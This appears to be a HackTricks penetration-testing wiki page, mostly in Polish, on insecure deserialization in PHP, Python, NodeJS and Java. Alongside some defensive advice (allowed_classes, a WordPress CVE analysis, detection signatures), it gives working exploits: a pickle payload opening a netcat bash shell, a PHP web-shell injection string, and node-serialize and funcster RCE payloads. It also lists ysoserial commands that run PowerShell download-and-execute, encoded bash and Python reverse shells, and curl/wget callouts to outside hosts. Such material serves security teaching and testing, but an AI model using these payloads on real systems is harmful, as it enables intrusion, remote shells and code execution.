# Deserialization

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje

**Serialization** rozumiana jest jako metoda konwersji obiektu do formatu, który można zachować, w celu przechowywania obiektu lub przesłania go w procesie komunikacji. Technika ta jest powszechnie stosowana, aby zapewnić możliwość odtworzenia obiektu w późniejszym czasie, zachowując jego strukturę i stan.

**Deserialization**, przeciwnie, to proces odwrotny do serialization. Polega na pobraniu danych sformatowanych w określony sposób i odtworzeniu ich z powrotem w postaci obiektu.

Deserialization może być niebezpieczna, ponieważ potencjalnie **pozwala atakującym manipulować danymi serializowanymi w celu wykonania złośliwego kodu** lub powodować nieoczekiwane zachowanie aplikacji podczas procesu odtwarzania obiektu.

## PHP

W PHP w trakcie procesów serialization i deserialization używane są określone metody magiczne:

- `__sleep`: Wywoływana, gdy obiekt jest serializowany. Metoda ta powinna zwrócić tablicę nazw wszystkich właściwości obiektu, które mają zostać serializowane. Zwykle używana do zapisania oczekujących danych lub wykonania podobnych czynności porządkowych.
- `__wakeup`: Wywoływana, gdy obiekt jest deserializowany. Służy do odtworzenia połączeń z bazą danych, które mogły zostać utracone podczas serialization, oraz do wykonania innych zadań inicjalizacyjnych.
- `__unserialize`: Ta metoda jest wywoływana zamiast `__wakeup` (jeśli istnieje) podczas deserializacji obiektu. Daje większą kontrolę nad procesem deserializacji w porównaniu do `__wakeup`.
- `__destruct`: Metoda ta jest wywoływana, gdy obiekt ma zostać zniszczony lub gdy skrypt się kończy. Zazwyczaj używana do zadań porządkowych, np. zamykania uchwytów do plików lub połączeń z bazą danych.
- `__toString`: Metoda ta pozwala traktować obiekt jak string. Może być użyta do odczytu pliku lub innych zadań opartych na wywołaniach funkcji wewnątrz niej, efektywnie dostarczając tekstową reprezentację obiektu.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Jeśli spojrzysz na wyniki możesz zobaczyć, że funkcje **`__wakeup`** i **`__destruct`** są wywoływane, gdy obiekt jest deserializowany. Zauważ, że w wielu samouczkach znajdziesz, że funkcja **`__toString`** jest wywoływana przy próbie wypisania jakiegoś atrybutu, ale najwyraźniej to **już się nie dzieje**.

> [!WARNING]
> Metoda **`__unserialize(array $data)`** jest wywoływana **zamiast `__wakeup()`** jeśli jest zaimplementowana w klasie. Pozwala ona odtworzyć obiekt z zserializowanych danych przekazanych jako tablica. Możesz użyć tej metody do ustawienia właściwości i wykonania wszelkich niezbędnych czynności podczas deserializacji.
>
> ```php
> class MyClass {
>    private $property;
>
>    public function __unserialize(array $data): void {
>        $this->property = $data['property'];
>        // Perform any necessary tasks upon deserialization.
>    }
> }
> ```

Przykład w **PHP** z wyjaśnieniami znajdziesz tutaj: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), tutaj [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) lub tutaj [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

Możesz nadużyć funkcjonalności PHP autoload, aby załadować dowolne pliki php i inne:


{{#ref}}
php-deserialization-+-autoload-classes.md
{{#endref}}

### Serializowanie wartości referencyjnych

Jeśli z jakiegoś powodu chcesz zserializować wartość jako **referencję do innej zserializowanej wartości** możesz:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### Zapobieganie PHP Object Injection za pomocą `allowed_classes`

> [!INFO]
> Wsparcie dla **drugiego argumentu** `unserialize()` (tablica `$options`) zostało dodane w **PHP 7.0**. W starszych wersjach funkcja przyjmuje tylko zserializowany string, co uniemożliwia ograniczenie, które klasy mogą być instancjonowane.

`unserialize()` będzie **tworzyć instancje każdej klasy**, którą znajdzie w strumieniu zserializowanych danych, chyba że poinformujesz inaczej. Od PHP 7 zachowanie to można ograniczyć przy pomocy opcji [`allowed_classes`](https://www.php.net/manual/en/function.unserialize.php):
```php
// NEVER DO THIS – full object instantiation
$object = unserialize($userControlledData);

// SAFER – disable object instantiation completely
$object = unserialize($userControlledData, [
'allowed_classes' => false    // no classes may be created
]);

// Granular – only allow a strict white-list of models
$object = unserialize($userControlledData, [
'allowed_classes' => [MyModel::class, DateTime::class]
]);
```
Jeśli **`allowed_classes` zostanie pominięte _lub_ kod działa na PHP < 7.0**, wywołanie staje się **niebezpieczne**, ponieważ atakujący może przygotować payload, który nadużywa magicznych metod takich jak `__wakeup()` lub `__destruct()` w celu uzyskania Remote Code Execution (RCE).

#### Przykład z rzeczywistego świata: Everest Forms (WordPress) CVE-2025-52709

Wtyczka WordPress **Everest Forms ≤ 3.2.2** próbowała zabezpieczyć się za pomocą helper wrappera, ale zapomniała o starszych wersjach PHP:
```php
function evf_maybe_unserialize($data, $options = array()) {
if (is_serialized($data)) {
if (version_compare(PHP_VERSION, '7.1.0', '>=')) {
// SAFE branch (PHP ≥ 7.1)
$options = wp_parse_args($options, array('allowed_classes' => false));
return @unserialize(trim($data), $options);
}
// DANGEROUS branch (PHP < 7.1)
return @unserialize(trim($data));
}
return $data;
}
```
Na serwerach, które wciąż uruchamiały **PHP ≤ 7.0**, ta druga gałąź prowadziła do klasycznego **PHP Object Injection**, gdy administrator otworzył złośliwe przesłanie formularza. Minimalny exploit payload mógłby wyglądać tak:
```
O:8:"SomeClass":1:{s:8:"property";s:28:"<?php system($_GET['cmd']); ?>";}
```
W momencie, gdy admin obejrzał wpis, obiekt został zainicjalizowany, a `SomeClass::__destruct()` zostało wykonane, skutkując wykonaniem dowolnego kodu.

**Wnioski**
1. Zawsze przekazuj `['allowed_classes' => false]` (lub rygorystyczną white-list) przy wywoływaniu `unserialize()`.
2. Audytuj wrappery zabezpieczające – często pomijają wsparcie dla starych gałęzi PHP.
3. Aktualizacja do **PHP ≥ 7.x** sama w sobie *nie* wystarcza: opcja nadal musi być ustawiona jawnie.

---

### PHPGGC (ysoserial for PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) może pomóc w generowaniu payloadów do wykorzystania przy PHP deserializations.\
Zauważ, że w niektórych przypadkach **nie będziesz w stanie znaleźć sposobu na abuse a deserialization in the source code** aplikacji, ale być może uda się **abuse the code of external PHP extensions.**\
Dlatego, jeśli możesz, sprawdź `phpinfo()` serwera i **wyszukaj w internecie** (nawet w **gadgets** **PHPGGC**) możliwe gadgety, które mógłbyś abuse.

### phar:// metadata deserialization

Jeśli znalazłeś LFI, które jedynie odczytuje plik i nie wykonuje kodu PHP w jego wnętrzu — na przykład używając funkcji takich jak _**file_get_contents(), fopen(), file() or file_exists(), md5_file(), filemtime() or filesize()**_. — możesz spróbować abuse a **deserialization** zachodzącą podczas **reading** **file** przy użyciu protokołu **phar**.\
Aby uzyskać więcej informacji, przeczytaj następujący post:


{{#ref}}
../file-inclusion/phar-deserialization.md
{{#endref}}

## Python

### **Pickle**

Kiedy obiekt zostanie unpickle, funkcja \_\_\_reduce\_\_\_ zostanie wykonana.\
W przypadku exploitacji serwer może zwrócić błąd.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Before checking the bypass technique, try using `print(base64.b64encode(pickle.dumps(P(),2)))` to generate an object that is compatible with python2 if you're running python3.

For more information about escaping from **pickle jails** check:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

### Yaml **&** jsonpickle

Poniższa strona przedstawia technikę pozwalającą **abuse an unsafe deserialization in yamls** python libraries i kończy się narzędziem, które można użyć do wygenerowania ładunku RCE deserializacji dla **Pickle, PyYAML, jsonpickle and ruamel.yaml**:


{{#ref}}
python-yaml-deserialization.md
{{#endref}}

### Class Pollution (Python Prototype Pollution)


{{#ref}}
../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md
{{#endref}}

## NodeJS

### JS Magic Functions

JS **doesn't have "magic" functions** like PHP or Python that are going to be executed just for creating an object. But it has some **functions** that are **frequently used even without directly calling them** such as **`toString`**, **`valueOf`**, **`toJSON`**.\
If abusing a deserialization you can **compromise these functions to execute other code** (potentially abusing prototype pollutions) you could execute arbitrary code when they are called.

Another **"magic" way to call a function** without calling it directly is by **compromising an object that is returned by an async function** (promise). Because, if you **transform** that **return object** in another **promise** with a **property** called **"then" of type function**, it will be **executed** just because it's returned by another promise. _Follow_ [_**this link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _for more info._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise((resolve) => {
console.log("hello")
resolve()
})
return p
}

async function test_then() {
const p = new Promise((then) => {
console.log("hello")
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` and `prototype` pollution

Jeśli chcesz poznać tę technikę, **zapoznaj się z następującym samouczkiem**:


{{#ref}}
nodejs-proto-prototype-pollution/
{{#endref}}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Ta biblioteka pozwala serializować funkcje. Przykład:
```javascript
var y = {
rce: function () {
require("child_process").exec("ls /", function (error, stdout, stderr) {
console.log(stdout)
})
},
}
var serialize = require("node-serialize")
var payload_serialized = serialize.serialize(y)
console.log("Serialized: \n" + payload_serialized)
```
**Zserializowany obiekt** będzie wyglądał następująco:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Możesz zobaczyć w przykładzie, że gdy funkcja jest serializowana, do zserializowanego obiektu jest dołączana flaga `_$$ND_FUNC$$_`.

W pliku `node-serialize/lib/serialize.js` znajdziesz tę samą flagę i sposób, w jaki kod jej używa.

![](<../../images/image (351).png>)

![](<../../images/image (446).png>)

Jak widać w ostatnim fragmencie kodu, **jeśli flaga zostanie znaleziona** `eval` jest używane do deserializacji funkcji, więc w zasadzie **user input jest używany wewnątrz funkcji `eval`**.

Jednak **samo serializowanie** funkcji **nie spowoduje jej wykonania**, ponieważ konieczne byłoby, aby jakaś część kodu **wywoływała `y.rce`** w naszym przykładzie, a to jest wysoce **mało prawdopodobne**.\
Tak czy inaczej, możesz po prostu **zmodyfikować zserializowany obiekt**, **dodając nawiasy**, aby automatycznie uruchomić zserializowaną funkcję podczas deserializacji obiektu.\
W następnym fragmencie kodu **zwróć uwagę na ostatni nawias** i na to, jak funkcja `unserialize` automatycznie wykona kod:
```javascript
var serialize = require("node-serialize")
var test = {
rce: "_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()",
}
serialize.unserialize(test)
```
Jak wskazano wcześniej, ta biblioteka pobierze kod po `_$$ND_FUNC$$_` i **wykona go** za pomocą `eval`. Dlatego, aby **automatycznie wykonać kod**, możesz **usunąć część tworzącą funkcję** i ostatni nawias oraz **po prostu uruchomić jednolinijkowy skrypt JS**, jak w poniższym przykładzie:
```javascript
var serialize = require("node-serialize")
var test =
"{\"rce\":\"_$$ND_FUNC$$_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })\"}"
serialize.unserialize(test)
```
Możesz [**znaleźć tutaj**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **dalsze informacje** o tym, jak wykorzystać tę podatność.

### [funcster](https://www.npmjs.com/package/funcster)

Istotnym aspektem **funcster** jest brak dostępu do **standardowych obiektów wbudowanych**; znajdują się one poza dostępnym zakresem. To ograniczenie uniemożliwia wykonanie kodu, który próbuje wywołać metody na obiektach wbudowanych, co prowadzi do wyjątków takich jak "ReferenceError: console is not defined" przy użyciu poleceń typu console.log() lub require(something).

Pomimo tego ograniczenia, możliwe jest przywrócenie pełnego dostępu do kontekstu globalnego, łącznie ze wszystkimi standardowymi obiektami wbudowanymi, za pomocą określonego podejścia. Poprzez bezpośrednie odwołanie się do kontekstu globalnego można obejść to ograniczenie. Na przykład dostęp można przywrócić używając następującego fragmentu:
```javascript
funcster = require("funcster")
//Serialization
var test = funcster.serialize(function () {
return "Hello world!"
})
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = {
__js_function: 'this.constructor.constructor("console.log(1111)")()',
}
funcster.deepDeserialize(desertest2)
var desertest3 = {
__js_function:
"this.constructor.constructor(\"require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\")()",
}
funcster.deepDeserialize(desertest3)
```
**Więcej informacji**[ **more information read this source**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Pakiet **serialize-javascript** jest przeznaczony wyłącznie do celów serializacji i nie zawiera wbudowanych możliwości deserializacji. Użytkownicy są odpowiedzialni za zaimplementowanie własnej metody deserializacji. Oficjalny przykład sugeruje bezpośrednie użycie `eval` do deserializacji zserializowanych danych:
```javascript
function deserialize(serializedJavascript) {
return eval("(" + serializedJavascript + ")")
}
```
Jeśli ta funkcja jest używana do deserialize obiektów, możesz **łatwo ją exploitować**:
```javascript
var serialize = require("serialize-javascript")
//Serialization
var test = serialize(function () {
return "Hello world!"
})
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test =
"function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Więcej informacji:** [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)

### Cryo library

Na kolejnych stronach znajdziesz informacje o tym, jak nadużyć tej biblioteki, aby wykonać dowolne polecenia:

- [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
- [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

W Java, **deserialization callbacks są wykonywane podczas procesu deserialization**. To wykonywanie może zostać wykorzystane przez atakujących, którzy tworzą złośliwe payloads wywołujące te callbacks, prowadząc do potencjalnego wykonania szkodliwych działań.

### Fingerprints

#### White Box

Aby zidentyfikować potencjalne serialization vulnerabilities w codebase, szukaj:

- Klasy implementujące interfejs `Serializable`.
- Użycia `java.io.ObjectInputStream`, funkcji `readObject`, `readUnshare`.

Zwróć szczególną uwagę na:

- `XMLDecoder` wykorzystywany z parametrami określonymi przez zewnętrznych użytkowników.
- metodę `fromXML` w `XStream`, szczególnie jeśli wersja XStream jest mniejsza lub równa 1.46, ponieważ jest podatna na serialization issues.
- `ObjectInputStream` używany razem z metodą `readObject`.
- Implementacje metod takich jak `readObject`, `readObjectNodData`, `readResolve` lub `readExternal`.
- `ObjectInputStream.readUnshared`.
- Ogólne użycie `Serializable`.

#### Black Box

Dla testów Black Box szukaj specyficznych **signatures** lub "Magic Bytes", które oznaczają java serialized objects (pochodzących z `ObjectInputStream`):

- Wzorzec heksadecymalny: `AC ED 00 05`.
- Wzorzec Base64: `rO0`.
- Nagłówki odpowiedzi HTTP z `Content-type` ustawionym na `application/x-java-serialized-object`.
- Wzorzec heksadecymalny wskazujący na wcześniejszą kompresję: `1F 8B 08 00`.
- Wzorzec Base64 wskazujący na wcześniejszą kompresję: `H4sIA`.
- Pliki webowe z rozszerzeniem `.faces` oraz parametr `faces.ViewState`. Odkrycie tych wzorców w aplikacji webowej powinno skłonić do analizy opisanej w poście [post about Java JSF ViewState Deserialization](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Sprawdź, czy podatne

Jeśli chcesz **dowiedzieć się, jak działa Java Deserialized exploit** powinieneś zapoznać się z [**Basic Java Deserialization**](basic-java-deserialization-objectinputstream-readobject.md), [**Java DNS Deserialization**](java-dns-deserialization-and-gadgetprobe.md), and [**CommonsCollection1 Payload**](java-transformers-to-rutime-exec-payload.md).

#### SignedObject-gated deserialization and pre-auth reachability

Współczesne codebases czasami opakowują deserializację za pomocą `java.security.SignedObject` i weryfikują podpis przed wywołaniem `getObject()` (które deserializuje obiekt wewnętrzny). To zapobiega użyciu arbitralnych top-level gadget classes, ale nadal może być exploitable, jeśli atakujący uzyska prawidłowy podpis (np. private-key compromise lub signing oracle). Dodatkowo, ścieżki obsługi błędów mogą wygenerować session-bound tokens dla niezalogowanych użytkowników, ujawniając w przeciwnym razie chronione sinks pre-auth.

For a concrete case study with requests, IoCs, and hardening guidance, see:

{{#ref}}
java-signedobject-gated-deserialization.md
{{#endref}}

#### White Box Test

Możesz sprawdzić, czy zainstalowana jest jakaś aplikacja z znanymi podatnościami.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Możesz spróbować **sprawdzić wszystkie biblioteki** znane jako podatne i dla których [**Ysoserial** ](https://github.com/frohoff/ysoserial) może dostarczyć exploit. Albo możesz sprawdzić biblioteki wskazane na [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
Możesz też użyć [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) do wyszukania możliwych gadget chains, które można wykorzystać.\
Uruchamiając **gadgetinspector** (po zbudowaniu) nie zwracaj uwagi na masę warningów/błędów, przez które przechodzi, i pozwól mu skończyć. Zapisze wszystkie wyniki pod _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Zauważ, że **gadgetinspector nie stworzy exploita i może wskazywać false positives**.

#### Test czarnej skrzynki

Używając rozszerzenia Burp [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) możesz zidentyfikować **które biblioteki są dostępne** (a nawet ich wersje). Z tą informacją może być **łatwiej wybrać payload** do wykorzystania podatności.\
[**Read this to learn more about GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe koncentruje się na **`ObjectInputStream` deserializacjach**.

Używając rozszerzenia Burp [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) możesz **zidentyfikować biblioteki** podatne na atak przy użyciu ysoserial i **wykorzystać** je.\
[**Read this to learn more about Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner skupia się na deserializacjach **`ObjectInputStream`**.

Możesz też użyć [**Freddy**](https://github.com/nccgroup/freddy) do **wykrywania podatności deserializacji** w **Burp**. Ten plugin wykryje **nie tylko podatności związane z `ObjectInputStream`**, ale **również** podatności w bibliotekach deserializacji **Json** i **Yml**. W trybie aktywnym spróbuje je potwierdzić za pomocą payloadów sleep lub DNS.\
[**You can find more information about Freddy here.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Test serializacji**

Nie chodzi tylko o sprawdzenie, czy serwer używa jakiejś podatnej biblioteki. Czasami możesz być w stanie **zmienić dane wewnątrz zserializowanego obiektu i obejść pewne kontrole** (np. uzyskać uprawnienia administratora w webappie).\
Jeśli znajdziesz java serialized object wysyłany do aplikacji webowej, **możesz użyć** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **aby wypisać w bardziej czytelnej formie obiekt serializacji, który jest wysyłany**. Wiedząc, jakie dane wysyłasz, łatwiej będzie je modyfikować i ominąć niektóre kontrole.

### **Eksploit**

#### **ysoserial**

Głównym narzędziem do wykorzystania Java deserializations jest [**ysoserial**](https://github.com/frohoff/ysoserial) ([**download here**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Możesz również rozważyć użycie [**ysoserial-modified**](https://github.com/pimps/ysoserial-modified), które pozwoli Ci używać złożonych poleceń (na przykład z pipe'ami).\
Zauważ, że to narzędzie jest **skoncentrowane** na eksploatacji deserializacji **`ObjectInputStream`**.\
Zalecałbym **zacząć od użycia payloadu "URLDNS"** przed payloadem typu RCE, aby sprawdzić, czy wstrzyknięcie jest możliwe. W każdym razie pamiętaj, że payload "URLDNS" może nie działać, a inny payload RCE może zadziałać.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Tworząc payload dla **java.lang.Runtime.exec()** nie możesz używać znaków specjalnych takich jak ">" czy "|" do przekierowywania wyjścia wykonania, "$()" do wykonywania poleceń ani nawet **przekazywać argumentów** do polecenia oddzielonych **spacjami** (możesz użyć `echo -n "hello world"`, ale nie możesz użyć `python2 -c 'print "Hello world"'`). Aby poprawnie zakodować payload możesz [skorzystać z tej strony](http://www.jackson-t.ca/runtime-exec-payloads.html).

Możesz użyć poniższego skryptu, aby wygenerować **wszystkie możliwe payloady code execution** dla Windows i Linux, a następnie przetestować je na podatnej stronie:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Możesz **użyć** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **wraz z ysoserial, aby stworzyć więcej exploits**. Więcej informacji o tym narzędziu znajduje się w **slajdach z prezentacji**, na której narzędzie zostało zaprezentowane: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec) może być użyty do generowania payloads, które pozwalają exploitować różne biblioteki serializacji **Json** i **Yml** w Java.\
Aby skompilować projekt musiałem **dodać** te **zależności** do `pom.xml`:
```html
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Zainstaluj maven**, i **skompiluj** projekt:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Przeczytaj więcej o tej bibliotece Java JSON: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Laboratoria

- If you want to test some ysoserial payloads you can **run this webapp**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
- [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Dlaczego

Java intensywnie używa serializacji do różnych celów, takich jak:

- **HTTP requests**: Serializacja jest powszechnie stosowana przy zarządzaniu parametrami, ViewState, cookies itp.
- **RMI (Remote Method Invocation)**: Protokół Java RMI, który opiera się całkowicie na serializacji, jest fundamentem komunikacji zdalnej w aplikacjach Java.
